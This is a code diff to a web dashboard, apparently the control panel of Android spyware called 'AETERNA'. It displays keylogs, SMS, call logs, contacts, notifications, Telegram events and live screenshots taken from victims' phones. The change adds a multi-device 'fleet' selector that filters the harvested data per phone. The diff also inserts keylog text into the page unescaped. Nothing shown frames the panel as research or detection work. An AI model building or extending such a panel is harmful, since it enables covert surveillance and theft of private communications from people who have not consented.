@@ -403,13 +403,22 @@
     <div class="dash-header">
       <div>
         <h1 style="font-size: 20px; font-weight: 900; color: var(--cyan);">AETERNA // SYSTEMDEF VAULT</h1>
-        <p style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted);">
-          PHYSICAL ANCHOR: SAMSUNG S24 ULTRA (SM-S928B)
-        </p>
+        <div style="display: flex; align-items: center; gap: 10px; margin-top: 4px;">
+          <label style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); font-weight: 700;">📱 DEVICE SESSION:</label>
+          <select id="device-selector" onchange="onDeviceSelected()" style="background: var(--card); border: 1px solid var(--cyan); color: #fff; font-family: 'JetBrains Mono', monospace; font-size: 11px; padding: 4px 10px; border-radius: 6px; outline: none; cursor: pointer;">
+            <option value="ALL">🌐 ALL DEVICES (Unified Fleet)</option>
+            <option value="RZCX326316L" selected>🟢 Samsung Galaxy S24 Ultra (SM-S928B)</option>
+          </select>
+        </div>
       </div>
-      <div class="status-pill">
-        <div class="pulse-dot"></div>
-        <span id="live-records-count">INGESTION ACTIVE</span>
+      <div style="display: flex; gap: 12px; align-items: center;">
+        <div class="status-pill" id="fleet-count-pill" style="background: rgba(0, 240, 255, 0.08); border: 1px solid rgba(0, 240, 255, 0.3);">
+          <span style="font-size: 11px; color: var(--cyan); font-weight: 800;" id="fleet-count">1 Active Device</span>
+        </div>
+        <div class="status-pill">
+          <div class="pulse-dot"></div>
+          <span id="live-records-count">INGESTION ACTIVE</span>
+        </div>
       </div>
     </div>
 
@@ -568,11 +577,56 @@
       img.src = `${HOST_ENDPOINT}/api/screen.png?t=${Date.now()}`;
     }
 
+    let selectedDeviceId = "ALL";
+    let devicesList = [];
+
+    function updateDeviceSelector(devices) {
+      if (!devices || devices.length === 0) return;
+      devicesList = devices;
+      const sel = document.getElementById('device-selector');
+      const currentVal = sel.value;
+      
+      let html = `<option value="ALL" ${selectedDeviceId === 'ALL' ? 'selected' : ''}>🌐 ALL DEVICES (Unified Fleet - ${devices.length})</option>`;
+      devices.forEach(d => {
+        const isOnline = d.status === 'ONLINE';
+        const icon = isOnline ? '🟢' : '⚪';
+        const isSel = selectedDeviceId === d.deviceId ? 'selected' : '';
+        html += `<option value="${d.deviceId}" ${isSel}>${icon} ${d.name || d.model} (${d.number || 'No SIM'})</option>`;
+      });
+      sel.innerHTML = html;
+
+      const onlineCount = devices.filter(d => d.status === 'ONLINE').length;
+      document.getElementById('fleet-count').textContent = `${onlineCount} Online / ${devices.length} Total Devices`;
+    }
+
+    function onDeviceSelected() {
+      selectedDeviceId = document.getElementById('device-selector').value;
+      updateBadges();
+      renderTelegramFeed();
+      renderNotifs();
+      renderCalls();
+      renderSms();
+      renderContacts();
+      renderKeylogs();
+    }
+
+    function matchDevice(item) {
+      if (selectedDeviceId === "ALL") return true;
+      if (!item) return false;
+      if (item.deviceId && item.deviceId === selectedDeviceId) return true;
+      if (item.device && item.device.includes(selectedDeviceId)) return true;
+      return false;
+    }
+
     async function fetchRecords() {
       try {
         const res = await fetch(`${HOST_ENDPOINT}/api/records`);
         if (res.ok) {
-          records = await res.json();
+          const data = await res.json();
+          records = data;
+          if (data.devices) {
+            updateDeviceSelector(data.devices);
+          }
           updateBadges();
           renderTelegramFeed();
           renderNotifs();
@@ -592,19 +646,26 @@
     }
 
     function updateBadges() {
-      document.getElementById('b-tg').textContent = (records.events || []).length;
-      document.getElementById('b-notifs').textContent = records.notifications.length;
-      document.getElementById('b-calls').textContent = records.calls.length;
-      document.getElementById('b-sms').textContent = records.sms.length;
-      document.getElementById('b-contacts').textContent = records.contacts.length;
-      document.getElementById('b-keylog').textContent = records.keylogs.length;
+      const tgCount = (records.events || []).filter(matchDevice).length;
+      const notifCount = (records.notifications || []).filter(matchDevice).length;
+      const callCount = (records.calls || []).filter(matchDevice).length;
+      const smsCount = (records.sms || []).filter(matchDevice).length;
+      const contCount = (records.contacts || []).filter(matchDevice).length;
+      const keyCount = (records.keylogs || []).filter(matchDevice).length;
+
+      document.getElementById('b-tg').textContent = tgCount;
+      document.getElementById('b-notifs').textContent = notifCount;
+      document.getElementById('b-calls').textContent = callCount;
+      document.getElementById('b-sms').textContent = smsCount;
+      document.getElementById('b-contacts').textContent = contCount;
+      document.getElementById('b-keylog').textContent = keyCount;
     }
 
     function renderTelegramFeed() {
       const filter = (document.getElementById('filter-tg')?.value || '').toLowerCase();
       const grid = document.getElementById('grid-tg');
       const recent = document.getElementById('recent-stream');
-      const events = records.events || [];
+      const events = (records.events || []).filter(matchDevice);
 
       grid.innerHTML = events
         .filter(e => (e.event || '').toLowerCase().includes(filter))
@@ -632,6 +693,7 @@
       const filter = (document.getElementById('filter-notif')?.value || '').toLowerCase();
       const grid = document.getElementById('grid-notifs');
       grid.innerHTML = records.notifications
+        .filter(matchDevice)
         .filter(n => (n.appName + n.title + n.text).toLowerCase().includes(filter))
         .map(n => `
           <div class="event-card type-notification">
@@ -641,7 +703,7 @@
             </div>
             <div class="event-title">${escapeHtml(n.title)}</div>
             <div class="event-body">${escapeHtml(n.text)}</div>
-            <div class="event-meta"><span>Device: ${escapeHtml(n.device || 'S24 Ultra')}</span></div>
+            <div class="event-meta"><span>Device: ${escapeHtml(n.deviceName || n.device || 'Android')}</span></div>
           </div>
         `).join('') || '<div style="color: var(--muted);">Няма записани известия.</div>';
     }
@@ -650,6 +712,7 @@
       const filter = (document.getElementById('filter-calls')?.value || '').toLowerCase();
       const grid = document.getElementById('grid-calls');
       grid.innerHTML = records.calls
+        .filter(matchDevice)
         .filter(c => (c.number + c.contactName + c.callType).toLowerCase().includes(filter))
         .map(c => `
           <div class="event-card type-call">
@@ -659,6 +722,7 @@
             </div>
             <div class="event-title">${escapeHtml(c.number)} (${escapeHtml(c.contactName)})</div>
             <div class="event-body">Времетраене: ${escapeHtml(c.duration || '0s')}</div>
+            <div class="event-meta"><span>Device: ${escapeHtml(c.deviceName || c.device || 'Android')}</span></div>
           </div>
         `).join('') || '<div style="color: var(--muted);">Няма записани обаждания.</div>';
     }
@@ -667,6 +731,7 @@
       const filter = (document.getElementById('filter-sms')?.value || '').toLowerCase();
       const grid = document.getElementById('grid-sms');
       grid.innerHTML = records.sms
+        .filter(matchDevice)
         .filter(s => (s.number + s.message + s.contactName).toLowerCase().includes(filter))
         .map(s => `
           <div class="event-card type-sms">
@@ -676,6 +741,7 @@
             </div>
             <div class="event-title">От/До: ${escapeHtml(s.number)} (${escapeHtml(s.contactName)})</div>
             <div class="event-body">${escapeHtml(s.message)}</div>
+            <div class="event-meta"><span>Device: ${escapeHtml(s.deviceName || s.device || 'Android')}</span></div>
           </div>
         `).join('') || '<div style="color: var(--muted);">Няма записани SMS съобщения.</div>';
     }
@@ -684,6 +750,7 @@
       const filter = (document.getElementById('filter-contacts')?.value || '').toLowerCase();
       const grid = document.getElementById('grid-contacts');
       grid.innerHTML = records.contacts
+        .filter(matchDevice)
         .filter(c => (c.platform + c.initiator + c.target + c.details).toLowerCase().includes(filter))
         .map(c => `
           <div class="event-card type-contact">
@@ -693,6 +760,7 @@
             </div>
             <div class="event-title">${escapeHtml(c.initiator)} ➡️ ${escapeHtml(c.target)}</div>
             <div class="event-body">${escapeHtml(c.details || '')}</div>
+            <div class="event-meta"><span>Device: ${escapeHtml(c.deviceName || c.device || 'Android')}</span></div>
           </div>
         `).join('') || '<div style="color: var(--muted);">Няма данни от тракера.</div>';
     }
@@ -701,6 +769,7 @@
       const filter = (document.getElementById('filter-keylogs')?.value || '').toLowerCase();
       const grid = document.getElementById('grid-keylogs');
       grid.innerHTML = records.keylogs
+        .filter(matchDevice)
         .filter(k => (k.data || '').toLowerCase().includes(filter))
         .map(k => `
           <div class="event-card type-keylog">
@@ -709,6 +778,7 @@
               <span>${k.timestamp}</span>
             </div>
             <div class="event-body" style="white-space: pre-wrap;">${k.data}</div>
+            <div class="event-meta"><span>Device: ${escapeHtml(k.deviceName || k.device || 'Android')}</span></div>
           </div>
         `).join('') || '<div style="color: var(--muted);">Няма клавишни логове.</div>';
     }
